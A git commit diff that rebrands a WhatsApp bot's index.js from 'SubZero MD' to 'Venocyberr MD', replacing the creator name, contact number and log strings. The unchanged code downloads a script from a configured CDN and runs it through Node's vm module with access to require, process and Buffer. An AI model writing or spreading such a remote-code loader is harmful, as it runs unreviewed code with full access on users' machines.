db05ec571d48111cb7f631b614febcd1a752ca18
Study <kakanderaymond281@gmail.com>
2026-02-06 12:09:08 +0300

    Update index.js

--- index.js
+++ index.js
@@ -9,23 +9,24 @@ $$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
 \$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
  \______/  \______/ \_______/ \________| \_______|\__|       \______/
 
-@ Project Name : SubZero MD
-* Creator      : Darrell Mucheri ( Mr Frank OFC )
+@ Project Name : Venocyberr MD
+* Creator      : Rajola
+
 * My Git       : https//github.com/mrfr8nk
-* Contact      : wa.me/263776046121
+* Contact      : wa.me/255764489397
 * Channel      : https://whatsapp.com/channel/0029Vb7D70MI7BeC0xUnKb05
 * Release Date : 15 December 2024 12.01 AM
 */
 
 
-// ZIMBABWEAN STAR ON TOP
+// TANZANIAN STAR ON TOP
 const axios = require('axios');
 const vm = require('vm');
 const config = require('./settings.js');
 
 (async () => {
   try {
-    console.log("❄️ Subzero Synchronization Initiated !");
+    console.log("❄️ Venocyber Synchronization Initiated !");
     const { data: scriptCode } = await axios.get(`${config.CDN}/mrfrank/index.js`);
     new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
   } catch (err) {
